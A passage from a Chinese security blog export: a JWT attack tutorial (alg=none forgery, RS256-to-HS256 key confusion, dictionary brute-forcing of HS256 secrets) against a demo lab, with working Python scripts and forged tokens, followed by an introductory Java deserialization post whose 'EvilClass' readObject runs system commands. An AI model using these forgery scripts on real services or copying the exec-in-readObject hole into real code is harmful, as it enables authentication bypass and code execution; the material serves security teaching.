<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.leCmAQCAuPZiAnnZLj6yUvL2WJ2R9oXZAgvtg04cRC8</span><br></pre></td></tr></table></figure>

<p>如图，当前 jwt 指定的 alg 为 HS256 算法</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305170247.png" alt="image-20210305164732797"></p>
<p>取出JWT中的头部<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code>解码后，将算法<code>HS256</code>改为<code>none</code>,再使用<code>Base64url</code>编码，结果为 <code>ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0</code> ，将结果替换原始的header，再加上自己修改好的载荷(payload)，然后删除签名，但<strong>保留最后一个点</strong>，将其发送到演示页面，看 server 端是否接受 none 算法，从而绕过了算法签名。</p>
<blockquote>
<p>  <a href="https://jwt.io/">https://jwt.io/</a> 将 alg 为 none 视为恶意行为，所以，无法通过在线工具生成 JWT, 可以自己用<code>Base64url</code>编码后组合，也可以使用下面代码</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># @Author : yhy</span><br><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">print(jwt.encode(&#123;</span><br><span class="line">&quot;iss&quot;: &quot;http://demo.sjoerdlangkemper.nl/&quot;,</span><br><span class="line">&quot;iat&quot;: 1614933803,</span><br><span class="line">&quot;exp&quot;: 1614935003,</span><br><span class="line">&quot;data&quot;: &#123;</span><br><span class="line">&quot;hello&quot;: &quot;world&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;, key=&#x27;&#x27;, algorithm=&#x27;none&#x27;))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>另外，某些 JWT 实现对大小写敏感，所以，当none不通过时，可以继续尝试 None、nOne、NONE等等。上述代码只支持none，其它的请自行使用<code>Base64url</code>编码。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.</span><br></pre></td></tr></table></figure>

<p>攻击成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305170252.png" alt="image-20210305170222663"></p>
<h4 id="3-3-非对称加密向下降级为对称加密（将RS256算法改为HS256）"><a href="#3-3-非对称加密向下降级为对称加密（将RS256算法改为HS256）" class="headerlink" title="3.3 非对称加密向下降级为对称加密（将RS256算法改为HS256）"></a>3.3 非对称加密向下降级为对称加密（将RS256算法改为HS256）</h4><p>现在大多数应用使用的算法方案都采用 RSA 非对称加密，server 端保存私钥，用来签发 jwt，对传回来的 jwt 使用公钥解密验证。</p>
<p>如果后端的验证是根据header的alg选择算法，并且支持 HS256 对称加密算法， 碰到这种情况，我们可以修改 alg 为 HS256 对称加密算法，然后使用我们可以获取到的公钥作为 key 进行签名加密（ps：在靶场中我们是直接获取，在实战中，如果是对客户进行服务的话，我们可以让客户提供公钥，毕竟只是一个公钥，为了详细测出系统漏洞，这应该是被允许的，另一个可能的来源是服务器的TLS证书，从证书中导出公钥），这样一来，当我们将 jwt 传给 server 端的时候，server 端因为默认使用的是公钥解密，而算法为修改后的 HS256 对称加密算法，此时即不存在公钥私钥问题，因为对称密码算法只有一个key，所以肯定可以正常解密解析，从而绕过了算法限制。</p>
<p>当 server 端严格指定只允许使用 HMAC 或者 RSA 算法其中一种时候，那这种攻击手段是没有效果的。</p>
<p>使用靶场进行此次攻击 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a> 这是<code>RS256</code>加密</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306151931.png" alt="image-20210306151929356"></p>
<p>从源码中，我们也可以看到它需要一个RS256签名，但也接受一个HS256签名。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306151650.png" alt="image-20210306151610286"></p>
<p>靶场的公钥获取：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a> </p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305172816.png" alt="image-20210305172812817"></p>
<p>将公钥保存为<code>public.pem</code>，<strong>一定要在最后空一行</strong>、<strong>一定要在最后空一行</strong>、<strong>一定要在最后空一行</strong>，重要的事情说三遍</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152239.png" alt="image-20210306151222844"></p>
<p>运行脚本（打靶场时请将{…}中的值修改，如果您现在提交，它将失败，因为它已经过期）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="comment"># jwt 非对称加密，改为对称加密 ，需要公钥</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;public.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() <span class="comment"># 公钥</span></span><br><span class="line"><span class="built_in">print</span>(jwt.encode(&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;http://demo.sjoerdlangkemper.nl/&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1615015143</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1615016343</span>,</span><br><span class="line">  <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;JWT&quot;</span>: <span class="string">&quot;RS256 -&gt; HS256 test &quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, key=public, algorithm=<span class="string">&#x27;HS256&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pip install PyJWT</span><br><span class="line">python3 jwt_test.py</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152213.png" alt="image-20210305211926691"></p>
<p>如果出现以上错误，请执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pip uninstall jwt</span><br><span class="line">python3 -m pip uninstall PyJWT</span><br><span class="line">python3 -m pip install PyJWT</span><br></pre></td></tr></table></figure>

<p>运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152614.png" alt="image-20210305213239054"></p>
<p>查资料说是因为jwt模块更新后，为了防止滥用，加入了强校验，如果指定算法为 HS256 而提供 RSA 的公钥作为 key 时会报错，无法往下执行，需要注释掉 <strong>site-packages&#x2F;jwt&#x2F;algorithms.py</strong> 中的如下五行：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152610.png" alt="image-20210305213418057"></p>
<p>成功运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152104.png" alt="image-20210306152103157"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZGVtby5zam9lcmRsYW5na2VtcGVyLm5sLyIsImlhdCI6MTYxNTAxNTE0MywiZXhwIjoxNjE1MDE2MzQzLCJkYXRhIjp7IkpXVCI6IlJTMjU2IC0-IEhTMjU2IHRlc3QgIn19.HWN7y4FVaRZMNHiCWwcGuEOruLpPYKw_UOtNj4iXbC8</span><br></pre></td></tr></table></figure>

<p>提交JWT，攻击成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152109.png" alt="image-20210306152039256"></p>
<h4 id="3-4-暴力破解密钥"><a href="#3-4-暴力破解密钥" class="headerlink" title="3.4 暴力破解密钥"></a>3.4 暴力破解密钥</h4><p>当 alg 指定 HMAC 类对称加密算法时，可以进行针对 key 的暴力破解，比如当算法为HS256，HS256算法使用密钥对消息进行签名和验证，如果知道密钥，则可以创建自己的签名消息。所有当密钥不够牢固时，则可以使用蛮力或<a href="https://github.com/wallarm/jwt-secrets">字典</a>攻击将其破解。</p>
<p>靶场：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p>
<p>使用python脚本进行字典破解，将下方的 jwt_json 换成自己的值，字典可以从 <a href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a> 获取 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="comment"># jwt 暴力破解脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwt_json=<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNTAyMTAzNiwiZXhwIjoxNjE1MDIyMjM2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.x_ENVoZZRSDnjUqKHOAOYvTDrAtzfLw-_i02Qqry7so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jwt.secrets.list&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        key = line.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(jwt_json, verify=<span class="literal">True</span>, key=key, algorithms=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.InvalidSignatureError):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;verify key! --&gt;&#x27;</span> + key)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key not found!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306170654.png" alt="image-20210306165921066"></p>
<p>爆破出密钥为：<code>secret</code>，借助 <a href="https://jwt.io/#debugger">https://jwt.io/#debugger</a>  即可进行消息的恶意伪造，篡改，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306170702.png" alt="image-20210306165956842"></p>
<p>将左侧 jwt 复制发送，攻击成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306170715.png" alt="image-20210306170013690"></p>
<p>字典跑不出时，还可以使用 <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>  工具进行暴力破解</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>初探Java反序列化漏洞(一)</title>
    <url>/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
    <content><![CDATA[<blockquote>
<p>  学无止境，参考着资料边学边记录吧。</p>
</blockquote>
<h2 id="0x01-Java序列化与反序列化"><a href="#0x01-Java序列化与反序列化" class="headerlink" title="0x01 Java序列化与反序列化"></a>0x01 Java序列化与反序列化</h2><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程。这一过程将数据分解成字节流，以便存储在文件中或在网络上传输；</p>
<p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。就是打开字节流并重构成对象，恢复数据。</p>
<p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过以下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写入对象内容</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取对象内容</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-为什么需要序列化与反序列化"><a href="#0x02-为什么需要序列化与反序列化" class="headerlink" title="0x02 为什么需要序列化与反序列化"></a>0x02 为什么需要序列化与反序列化</h2><p>当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。而当两个Java进程进行通信时，可以通过Java的序列化与反序列化在进程之间直接传送对象，换句话说，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；接收方需要从字节序列中恢复出Java对象。</p>
<p>使用场景：</p>
<ul>
<li><p>想把内存中的对象保存到一个文件中或者数据库中时候；</p>
</li>
<li><p>想用套接字在网络上传送对象的时候；</p>
</li>
<li><p>想通过RMI传输对象的时候</p>
</li>
</ul>
<p>一些应用场景涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。</p>
<p>总之，序列化的用途就是传递和存储。</p>
<h2 id="0x03-序列化实现的方式"><a href="#0x03-序列化实现的方式" class="headerlink" title="0x03 序列化实现的方式"></a>0x03 序列化实现的方式</h2><h3 id="3-1-Serializable"><a href="#3-1-Serializable" class="headerlink" title="3.1 Serializable"></a>3.1 Serializable</h3><p>将要序列化的类实现 <code>Serializabel</code> 接口（Serializable接口是一个标记接口，不用实现任何方法。一旦实现了此接口，则表明该类的对象就是可序列化的），而且所有属性必须是可序列化的，就是如果一个可序列化的类的成员不是基本类型，也不是String类型，比如自己自定义的类，那这个引用类型也必须是可序列化的，否则，会导致此类不能序列化(用<code>transient</code>关键字修饰的属性除外，不参与序列化过程) 。</p>
<p><strong>需要序列化的类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 21:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>序列化</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSerializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line">        serialize(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(User user)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fout);</span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        out.close();</span><br><span class="line">        fout.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到运行后，生产了一个文件，将<code>user</code> 对象变成了可持久化存储的二进制数据。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211458.png" alt="image-20210404222530833"></p>
<p>可以来看一下该对象序列化后的二进制数据</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211505.png" alt="image-20210404223840477"></p>
<p>序列化的数据流以魔术数字和版本号开头，这个值是在调用<code>ObjectOutputStream</code>序列化时，由<code>writeStreamHeader</code>方法写入。开头的几位一般来当作Java序列化字节的特征。</p>
<p><strong>反序列化</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSerializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        <span class="comment">// 反序列化，将字节序列恢复为对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(user1.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        fileIn.close();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211519.png" alt="image-20210404224748419"></p>
<p>读取了序列化文件，将二进制文件重新恢复为<code>user</code>对象，对象里面的属性也是完美恢复。</p>
<h3 id="3-2-Externalizable"><a href="#3-2-Externalizable" class="headerlink" title="3.2 Externalizable"></a>3.2 Externalizable</h3><p>通过实现<code>Externalizable</code>接口进行序列化和反序列胡，但必须实现<code>writeExternal</code>、<code>readExternal</code>方法，并且还要实现一个类的<strong>无参构造方法</strong>，<code>Serializable</code> 接口可以不用实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/5 00:24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现了Externalizable这个接口需要提供无参构造，在反序列化时会检测</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用法和实现了<code>Serializable</code>接口一样，这里就不演示了。</p>
<h2 id="0x04-readObject-方法"><a href="#0x04-readObject-方法" class="headerlink" title="0x04 readObject()方法"></a>0x04 readObject()方法</h2><p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用。因为在序列化过程中，JVM虚拟机会试图调用对象类里的 <code>writeObject</code> 和 <code>readObject</code> 方法，进行用户自定义的序列化和反序列化，如果没有这样的方法，则默认调用是 <code>ObjectOutputStream</code> 的 <code>defaultWriteObject</code> 方法以及 <code>ObjectInputStream</code> 的 <code>defaultReadObject</code> 方法。用户自定义的 <code>writeObject</code> 和 <code>readObject</code> 方法可以允许用户控制序列化的过程，比如可以在序列化的过程中动态改变序列化的数值。 </p>
<blockquote>
<p>  Java反序列化的过程中可以自动执行序列化类的四个方法，实现了<code>Serializable</code>接口可以执行的方法包括<code>readObject</code>、<code>readObjectNoData</code>、<code>readResolve</code>，以及实现了<code>Externalizable</code>接口的<code>readExternal</code>方法。这些在找反序列化漏洞时都需要重点关注。</p>
</blockquote>
<p>如果<code>readObject</code>方法书写不当的话就有可能引发恶意代码的执行，例如</p>
<p><strong>基本类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:34</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass(String name)构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的getName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的setName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的toString()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EvilClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + getName() + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的readObject()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="comment">// windows</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, name&#125;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        